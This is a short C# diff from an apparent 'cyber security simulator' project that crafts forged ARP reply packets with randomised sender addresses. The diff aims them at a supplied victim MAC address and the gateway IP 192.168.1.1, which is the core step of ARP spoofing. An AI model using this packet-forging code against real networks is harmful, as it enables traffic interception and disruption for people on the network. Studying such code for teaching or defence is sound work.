@@ -56,8 +56,9 @@ namespace PDA_Cyber_Security_Simulator_V1
                             Operation = ArpOperation.Reply,
                             SenderHardwareAddress = new byte[] { 15, 16, 16, 3, (byte)rand.Next(1, 14), (byte)rand.Next(1, 14) }.AsReadOnly(), // 03:03:03:03:03:03.
                             SenderProtocolAddress = new byte[] { 192, 168, 1, (byte)rand.Next(5, 180) }.AsReadOnly(), // 1.2.3.4.
-                            TargetHardwareAddress = new byte[] { 4, 4, 4, 4, 4, 4 }.AsReadOnly(), // 04:04:04:04:04:04.
-                            TargetProtocolAddress = new byte[] { 192, 168, (byte)rand.Next(5, 180), (byte)rand.Next(5, 180) }.AsReadOnly(), // 11.22.33.44.
+                            //TargetHardwareAddress = new byte[] { 4, 4, 4, 4, 4, 4 }.AsReadOnly(), // 04:04:04:04:04:04.
+                            TargetHardwareAddress = new byte[] { Convert.ToByte(victimMacAddress.Substring(0, 2), 16), Convert.ToByte(victimMacAddress.Substring(3, 2), 16), Convert.ToByte(victimMacAddress.Substring(6, 2), 16), Convert.ToByte(victimMacAddress.Substring(9, 2), 16), Convert.ToByte(victimMacAddress.Substring(12, 2), 16), Convert.ToByte(victimMacAddress.Substring(15, 2), 16) }.AsReadOnly(),
+                            TargetProtocolAddress = new byte[] { 192, 168, 1, 1 }.AsReadOnly(), // 11.22.33.44.
                         };
 
                     PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
